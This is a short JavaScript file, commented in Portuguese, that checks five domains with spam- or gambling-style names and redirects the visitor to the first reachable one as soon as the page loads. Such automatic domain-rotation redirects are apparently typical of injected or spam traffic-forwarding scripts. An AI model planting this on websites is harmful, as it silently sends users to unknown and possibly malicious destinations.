// Lista de domínios para verificar
const domains = [
    'https://www.socialadirecionar.online',
    'https://www.hg0088.site',
    'https://www.friendshipquotes.site',
    'https://www.ivirtual.site',
    'https://reverselookup.site'
];

// Função para verificar a disponibilidade do domínio
async function checkDomain(domain) {
    try {
        const response = await fetch(domain, { method: 'GET', mode: 'no-cors' });
        console.log(`Checking ${domain}: `, response);
        return response.type === 'opaque' || response.ok;
    } catch (error) {
        console.log(`Error checking ${domain}: `, error);
        return false;
    }
}

// Função para redirecionar para o primeiro domínio disponível
async function redirectToAvailableDomain() {
    for (const domain of domains) {
        const isAvailable = await checkDomain(domain);
        if (isAvailable) {
            console.log(`Redirecting to ${domain}`);
            window.location.href = domain;
            return;
        }
    }
    console.log('Nenhum domínio disponível no momento.');
}

// Iniciar a verificação e redirecionamento ao carregar a página
window.onload = redirectToAvailableDomain;
